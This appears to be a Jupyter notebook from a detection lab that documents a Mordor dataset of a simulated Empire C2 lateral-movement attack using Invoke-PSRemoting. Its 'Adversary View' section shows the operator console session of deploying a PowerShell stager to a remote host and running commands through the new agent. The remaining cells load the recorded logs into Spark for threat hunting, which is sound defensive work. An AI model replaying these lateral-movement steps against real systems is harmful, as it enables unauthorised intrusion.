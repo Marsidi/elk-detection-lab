{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke PSRemoting"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518211456 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/lateral_movement/invoke_psremoting.py |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_psremoting.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries executing malicious code on remote hosts using PowerShell Remotely."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_psremoting\n",
    "(Empire: powershell/lateral_movement/invoke_psremoting) > info\n",
    "\n",
    "              Name: Invoke-PSRemoting\n",
    "            Module: powershell/lateral_movement/invoke_psremoting\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using PSRemoting.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name         Required    Value                     Description\n",
    "  ----         --------    -------                   -----------\n",
    "  Listener     True                                  Listener to use.                        \n",
    "  CredID       False                                 CredID from the store to use.           \n",
    "  ComputerName True                                  Host[s] to execute the stager on, comma \n",
    "                                                    separated.                              \n",
    "  Proxy        False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  UserName     False                                 [domain\\]username to use to execute     \n",
    "                                                    command.                                \n",
    "  ProxyCreds   False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "  UserAgent    False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "  Password     False                                 Password to use to execute command.     \n",
    "  Agent        True        V6W3TH8Y                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName IT001.shire.com\n",
    "(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName IT001.shire.com\n",
    "(Empire: powershell/lateral_movement/invoke_psremoting) > execute\n",
    "[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT\n",
    "[*] Agent V6W3TH8Y tasked with task ID 4\n",
    "[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psremoting\n",
    "(Empire: powershell/lateral_movement/invoke_psremoting) > [*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent 1NA52YVC checked in\n",
    "[+] Initial agent 1NA52YVC from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 1NA52YVC at 10.0.10.103\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psremoting) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 21:15:55  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 21:15:55  https           \n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 21:15:57  https           \n",
    "\n",
    "V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\\pgustavo          powershell         5204   5/0.0    2019-05-18 21:15:31  https           \n",
    "XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:15:57  https           \n",
    "1NA52YVC ps 172.18.39.105   IT001             *SHIRE\\pgustavo         powershell         6884   5/0.0    2019-05-18 21:15:55  https           \n",
    "\n",
    "\n",
    "(Empire: agents) > interact 1NA52YVC\n",
    "(Empire: 1NA52YVC) > shell whoami\n",
    "[*] Tasked 1NA52YVC to run TASK_SHELL\n",
    "[*] Agent 1NA52YVC tasked with task ID 1\n",
    "(Empire: 1NA52YVC) > shire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 1NA52YVC) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_psremoting.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
